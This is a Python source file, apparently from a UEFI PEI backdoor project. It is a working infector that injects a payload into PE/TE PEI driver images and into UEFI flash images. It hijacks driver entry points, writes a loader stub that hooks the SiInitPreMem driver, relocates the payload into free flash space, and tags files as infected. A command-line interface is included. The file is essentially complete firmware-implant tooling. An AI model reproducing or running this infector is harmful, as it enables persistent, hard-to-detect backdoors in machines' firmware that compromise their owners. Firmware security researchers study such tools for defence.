import sys, os, shutil, StringIO

from struct import pack, unpack
from optparse import OptionParser, make_option

# See struct _INFECTOR_CONFIG in PeiBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8 + 8

# See struct _BACKDOOR_INFO in PeiBackdoor.h
BACKDOOR_INFO_ADDR = 0x1000
BACKDOOR_INFO_FMT = 'QQ'
BACKDOOR_INFO_LEN = 8 + 8

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

def _infector_config_offset(pe):
        
    for section in pe.sections:

        # find .conf section of payload image
        if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

            return section.PointerToRawData

    raise(Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION))

def _infector_config_get(pe, data):

    offs = _infector_config_offset(pe)
    
    return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

def _infector_config_set(pe, data, *args):

    offs = _infector_config_offset(pe)

    return data[: offs] + \
           pack(INFECTOR_CONFIG_FMT, *args) + \
           data[offs + INFECTOR_CONFIG_LEN :]

def infect_PE(src, payload, dst = None):

    import pefile

    # load target image
    pe_src = pefile.PE(src)

    # load payload image
    pe_payload = pefile.PE(payload)
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise(Exception('%s is already infected' % src))

    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        raise(Exception('Architecture missmatch'))

    if pe_payload.OPTIONAL_HEADER.FileAlignment != \
       pe_payload.OPTIONAL_HEADER.SectionAlignment:

        raise(Exception('Bad payload image'))

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    conf_ep_new, _, _, conf_base = _infector_config_get(pe_payload, data)

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise(Exception('Last section virtual size must be less or equal than raw size'))

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old, 0, conf_base)

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN

    # get infected image data
    data = pe_src.write() + data

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data

class TEImageSection:

    TE_SECTION_HEADER = '<LLLLLLHHL'

    def __init__(self, fd):

        self.offset = fd.tell()

        # read section name
        self.name = fd.read(8)

        # read the rest of the section header
        self.virt_size, self.virt_addr, self.data_size, self.ptr_to_data, \
        self.ptr_to_relocs, self.ptr_to_line_nums, self.num_relocs, \
        self.num_line_nums, self.characteristics = unpack(self.TE_SECTION_HEADER, fd.read(32))

    def write(self, fd):

        # write section name
        fd.write(self.name)

        # write the rest of the section header
        fd.write(pack(self.TE_SECTION_HEADER, self.virt_size, self.virt_addr, self.data_size, \
                                     self.ptr_to_data, self.ptr_to_relocs, \
                                     self.ptr_to_line_nums, self.num_relocs, \
                                     self.num_line_nums, self.characteristics))

class TEImage:

    TE_HEADER_SIGNATURE = 0x5A56
    TE_HEADER_SIZE = 24 + 16

    TE_HEADER = '<HHBBHLLQ'
    TE_DATA_DIR = '<IIII'

    def __init__(self, name):

        # open input file
        fd = open(name, 'rb')

        self.offset = fd.tell()

        # read header
        self.signature, self.machine, self.num_sections, self.subsystem, \
        self.stripped_size, self.entry_point_addr, self.code_base, \
        self.image_base = unpack(self.TE_HEADER, fd.read(24))

        # read data directory
        addr_1, size_1, addr_2, size_2 = unpack(self.TE_DATA_DIR, fd.read(16))

        self.data_dir = [(addr_1, size_1), (addr_2, size_2)]
        self.sections = []

        # read section table
        for i in range(0, self.num_sections):

            self.sections.append(TEImageSection(fd))

        # read section data
        for section in self.sections:

            last_section = section
            section.data = fd.read(section.data_size)

            assert len(section.data) == section.data_size

        last_section.data += fd.read()

        # close input file
        fd.close()    

    def write(self, name = None):

        ret = None

        if name is None:

            # write data to memory buffer
            fd = StringIO.StringIO()

        else:

            # open input file
            fd = open(name, 'wb')

        # write header
        fd.write(pack(self.TE_HEADER, \
                      self.signature, self.machine, self.num_sections, \
                      self.subsystem, self.stripped_size, self.entry_point_addr, \
                      self.code_base, self.image_base))

        addr_1, size_1 = self.data_dir[0]
        addr_2, size_2 = self.data_dir[1]

        # write data directory
        fd.write(pack(self.TE_DATA_DIR, addr_1, size_1, addr_2, size_2))

        # write section table
        for section in self.sections:

            section.write(fd)

        # write section data
        for section in self.sections:

            fd.write(section.data)
            
        if name is None:

            ret = fd.getvalue()

        # close input file
        fd.close()  

        return ret  

def infect_TE(src, payload, dst = None):

    import pefile

    # load target image
    te_src = TEImage(name = src)

    # load payload image
    pe_payload = pefile.PE(payload)    

    if te_src.machine != pe_payload.FILE_HEADER.Machine:

        raise(Exception('Architecture missmatch'))  

    if pe_payload.OPTIONAL_HEADER.FileAlignment != \
       pe_payload.OPTIONAL_HEADER.SectionAlignment:

        raise(Exception('Bad payload image'))      

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    conf_ep_new, _, _, conf_base = _infector_config_get(pe_payload, data)    

    last_section = None
    for section in te_src.sections:

        # find last section of target image
        last_section = section

    if last_section.virt_size > last_section.data_size:

        raise(Exception('Last section virtual size must be less or equal than raw size'))

    # save original entry point address of target image
    conf_ep_old = te_src.entry_point_addr

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old, 0, conf_base)

    # set new entry point of target image
    te_src.entry_point_addr = \
        last_section.virt_addr + last_section.data_size + conf_ep_new

    # update last section size
    last_section.data_size += len(data)
    last_section.virt_size = last_section.data_size

    # make it executable
    last_section.characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']

    # get infected image data
    data = te_src.write() # + data

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data

def disasm(data):

    import capstone

    # get instruction length and mnemonic
    cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)

    for insn in cs.disasm(data, len(data)):

        return insn.mnemonic + ' ' + insn.op_str, insn.size

def infect_flash(src, payload, dst = None, patch_offs = None):

    # signature of the SiInitPreMem PEI driver data
    SIGNATURE = 'SPD \x00\x00\x00\x00Micron\x00\x00Hynix\x00\x00\x00' + \
                'Elpida\x00\x00Samsung\x00'

    # physical address where flash image will be mapped by system
    FLASH_ADDR = 0xff800000
    FLASH_SIZE = 0x800000

    # offset of the loader inside UEFI flash image
    LOADER_OFFS = 0
    LOADER_SIZE = 0x40

    # offset of the PE payload
    PAYLOAD_OFFS = LOADER_OFFS + LOADER_SIZE

    PUSH_RET_LEN = 5 + 1

    import pefile

    i386_machine_type = pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_I386']

    # load payload image
    pe_payload = pefile.PE(payload)

    # only 32-bit PEI code supported
    if pe_payload.FILE_HEADER.Machine != i386_machine_type:

        raise(Exception('Architecture missmatch'))

    if pe_payload.OPTIONAL_HEADER.FileAlignment != \
       pe_payload.OPTIONAL_HEADER.SectionAlignment:

        raise(Exception('Bad payload image'))

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read source flash image data into the string
    flash = open(src, 'rb').read()

    flash_get = lambda offs, size: flash[offs : offs + size]
    flash_set = lambda offs, data: flash[: offs] + data + \
                                   flash[offs + len(data) :]    

    if patch_offs is None:

        push_arg_insn = '\xFF\x74\x24\x08' # push dword [esp + 8]

        # locate SiInitPreMem PEI driver
        ptr = flash.find(SIGNATURE)
        if ptr == -1:

            raise(Exception('Unable to locate SiInitPreMem by signature'))

    else:

        push_arg_insn = '\x6A\x00\x90\x90' # push 0
        ptr = patch_offs

        if ptr > len(flash):

            raise(Exception('Invalid patch offset'))        

    # locate PEI driver header address
    while flash_get(ptr, 4) != '\x56\x5A\x4C\x01':

        ptr -= 1
        if ptr <= 0:

            raise(Exception('Unable to locate PEI driver image header'))

    print('Target PEI driver is located at offset 0x%x' % ptr)

    # read TE header
    signature, machine, num_sections, subsystem, \
    stripped_size, entry_point_addr, code_base, \
    image_base = unpack(TEImage.TE_HEADER, flash_get(ptr, 24))

    if machine != i386_machine_type:

        raise(Exception('Architecture missmatch'))

    if patch_offs is None:

        # calculate entry point offset
        delta = stripped_size - TEImage.TE_HEADER_SIZE
        patch_offs = ptr + entry_point_addr - delta

    patch_len = 0

    # decode first instructions to determinate patch length
    while patch_len < PUSH_RET_LEN:

        mnemonic, size = disasm(flash[patch_offs + patch_len:])        
        patch_len += size

    print('PEI driver image base is 0x%x' % image_base)    
    print('PEI driver image stripped size is 0x%x' % stripped_size)
    print('PEI driver patch location is at 0x%x (%x bytes)' % (patch_offs, patch_len))

    free = FLASH_SIZE
    free_size = 0x20000

    while free > 0:        

        # check for free space for loader and payload
        if flash_get(free, free_size) == '\xFF' * free_size:

            break

        free -= 0x1000

    if free <= 0:

        raise(Exception('Can\'t find free space for loader and payload'))   

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    ep_new, _, _, _ = _infector_config_get(pe_payload, data)        

    print('Loader is at offset 0x%x' % free) 
    print('Payload is at offset 0x%x (entry point RVA is 0x%x)' % (free + PAYLOAD_OFFS, ep_new))    

    def _setup_loader(offs):

        # copy PEI image entry arguments
        flash = flash_set(offs + 0x00, push_arg_insn)
        flash = flash_set(offs + 0x04, push_arg_insn)

        # call from loader to payload
        flash = flash_set(offs + 0x08, '\xE8' + pack('I', LOADER_SIZE + ep_new - 0x0D))

        # stack cleanup
        flash = flash_set(offs + 0x0D, '\x83\xC4\x08') # add esp, 8

        # save 6 bytes from OEP to LOADER_OFFS
        flash = flash_set(offs + 0x10, flash_get(patch_offs, patch_len))

        # jump from loader to OEP
        dest = FLASH_ADDR + patch_offs + patch_len
        flash = flash_set(offs + 0x10 + patch_len, '\x68' + pack('I', dest) + \
                                                   '\xC3')

    _setup_loader(free + LOADER_OFFS)

    # jump from OEP back to the loader
    flash = flash_set(patch_offs, '\x68' + pack('I', FLASH_ADDR + free + LOADER_OFFS) + \
                                  '\xC3')

    print('Target PEI driver was successfully patched')

    payload_addr = FLASH_ADDR + free + PAYLOAD_OFFS

    print('Relocating payload to 0x%x' % payload_addr)

    # relocate payload
    pe_payload.relocate_image(payload_addr)
    pe_payload.OPTIONAL_HEADER.ImageBase = payload_addr

    data = pe_payload.write()
    data = _infector_config_set(pe_payload, data, ep_new, 0, 0, payload_addr)

    # place payload image into the flash image
    flash = flash_set(free + PAYLOAD_OFFS, data)

    print('Flash was successfully infected')

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(flash)

    return flash

def main():    

    option_list = [

        make_option('-d', '--driver-image', dest = 'driver_image', default = None,
            help = 'infect existing PEI driver image'),

        make_option('-f', '--flash-image', dest = 'flash_image', default = None,
            help = 'infect existing UEFI flash image'),        

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'infect payload path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('--patch-offs', dest = 'patch_offs', default = None,
            help = 'optional offset of the location to patch for --flash-image')
    ]

    parser = OptionParser(option_list = option_list)
    (options, args) = parser.parse_args()

    if options.driver_image is not None:

        if options.payload is None:

            print('[!] --payload must be specified')
            return -1

        print('[+] Target image: ' + options.driver_image)
        print('[+] Payload: ' + options.payload)

        if options.output is None:

            backup = options.driver_image + '.bak'
            options.output = options.driver_image

            print('[+] Backup: ' + backup)

            # backup original file
            shutil.copyfile(options.driver_image, backup)

        print('[+] Output file: ' + options.output)

        # get image signature
        with open(options.driver_image, 'rb') as fd:

            signature = fd.read(2)

        # infect source file with specified payload
        if signature == 'VZ':

            # TE image as target
            infect_TE(options.driver_image, options.payload, dst = options.output) 

        elif signature == 'MZ':

            # PE image as target
            infect_PE(options.driver_image, options.payload, dst = options.output) 

        else:

            raise(Exception('Unknown image format'))

        return 0

    if options.flash_image is not None:

        if options.payload is None:

            print('[!] --payload must be specified')
            return -1

        print('[+] Target image: ' + options.flash_image)
        print('[+] Payload: ' + options.payload)

        if options.output is None:

            backup = options.flash_image + '.bak'
            options.output = options.flash_image

            print('[+] Backup: ' + backup)

            # backup original file
            shutil.copyfile(options.flash_image, backup)

        print('[+] Output file: ' + options.output)

        # infect UEFI firmware image
        infect_flash(options.flash_image, options.payload, \
            dst = options.output, 
            patch_offs = None if options.patch_offs is None else int(options.patch_offs, 16)) 

        return 0

    else:

        print('[!] No actions specified, try --help')
        return -1

# def end

if __name__ == '__main__':
    
    sys.exit(main())

#
# EoF
#
